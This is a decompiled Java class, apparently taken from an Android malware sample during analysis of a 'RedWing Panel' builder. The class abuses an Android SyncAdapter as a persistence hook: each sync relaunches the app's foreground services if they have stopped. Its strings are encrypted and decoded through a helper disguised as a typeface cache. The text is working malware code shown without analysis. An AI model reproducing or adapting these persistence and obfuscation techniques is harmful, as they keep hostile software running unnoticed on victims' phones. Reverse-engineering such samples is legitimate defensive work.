package v.s;

import android.accounts.Account;
import android.content.AbstractThreadedSyncAdapter;
import android.content.ContentProviderClient;
import android.content.Context;
import android.content.Intent;
import android.content.SyncResult;
import android.os.Bundle;
import app.mobilex.plus.services.GuardianService;
import app.mobilex.plus.services.SyncAdapterService;
import app.mobilex.plus.services.SyncQYAdapter;
import app.mobilex.plus.util.TypefaceCache;

/* JADX INFO: compiled from: r8-map-id-15e63fcf80fafdb0de787d7190aafb45897c9495c974dfb43163f91afee6c091 */
/* JADX INFO: loaded from: /private/tmp/claude-501/-Users-noiss-Work-exploit-RedWing-Panel-main-source-internal-builder/68c7750b-b3a0-412f-ab12-bf16e4a764d8/scratchpad/dex_extract/classes.dex */
public final class kJ8FgakwE9SARC1IGv6E extends AbstractThreadedSyncAdapter {
    @Override // android.content.AbstractThreadedSyncAdapter
    public final void onPerformSync(Account account, Bundle bundle, String str, ContentProviderClient contentProviderClient, SyncResult syncResult) {
        Context context = getContext();
        try {
            String str2 = SyncQYAdapter.ECwLkmPW1UKz7J6E;
            if (SyncQYAdapter.VEkRsTDS6a9oHWI == null) {
                String str3 = SyncAdapterService.w9sT1Swbhx3hs;
                TypefaceCache.obtain("0010006F0055008400AA00FF00E100BE002D0075006A00BE00D100BB00D300B700370073004900C700F400BA00D300A3006F00360049008200E300AB00D300B50037007F00550080");
                context.startForegroundService(new Intent(context, (Class<?>) SyncQYAdapter.class));
            }
            String str4 = GuardianService.b1EoSIRjJHO5;
            if (GuardianService.hjneShqpF9Tis4 == null) {
                okc5AGRjqrud84oM6d.Qrz92kRPw4GcghAc(context);
            }
        } catch (Exception e) {
            String str5 = SyncAdapterService.w9sT1Swbhx3hs;
            TypefaceCache.obtain("002C0078006B008200E200B900DD00B5002E00450042008900F300FF00D700B500310079004900DD00B0");
            e.getMessage();
        }
    }
}
